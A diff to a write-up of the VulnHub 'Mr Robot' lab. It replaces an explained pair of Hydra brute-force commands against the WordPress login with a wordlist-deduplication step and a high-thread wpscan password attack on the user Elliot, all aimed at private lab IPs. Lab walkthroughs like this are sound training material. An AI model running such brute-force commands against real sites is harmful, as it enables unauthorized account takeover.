@@ -135,28 +135,14 @@ This file listed two items: `fsocity.dic`, a dictionary file, and `key-1-of-3.tx
 └─$ wget http://192.168.56.108/fsocity.dic
 ```
 
+Lets then remove the duplicates
+`cat fsocity.dic| sort | uniq > filtered_list.dic`
+
 
 ## Brute-Forcing WordPress Login
-
-Now, let’s move on to the `wp-admin` and `wp-login.php` pages. WordPress login pages are often vulnerable to username enumeration. This means you can try different usernames and see how the error messages change. If the username is correct, but the password is wrong, WordPress will tell you. Otherwise, it will just say the username is invalid.
-
-For this, I used the `fsocity.dic` wordlist I downloaded earlier and a tool called `Hydra` to automate the brute-forcing process.
-
-Here’s the command I used:
+This command will brute force the login page using wpscan
 ```
-┌──(kali㉿kali)-[~/vulnhub/mrRobot]
-└─$ hydra -L fsocity.dic -p password 192.168.56.108 http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=Invalid username'
-```
-
-- `-L fsocity.dic`: Uses the downloaded dictionary file as a list of possible usernames.
-- `-p password`: Specifies a password to test against each username.
-- `http-post-form`: Indicates that we’re targeting a web form.
-
-Hydra successfully identified a valid username: `Elliot`.
-
-Next, I adjusted the command to brute-force the password:
-```
-hydra -l elliot -P fsocity.dic 192.168.56.108 http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=is incorrect'
+wpscan -t 1000 -U Elliot -P filtered_list.dic --url http://192.168.233.90/
 ```
 
 ## Gaining Access with Metasploit
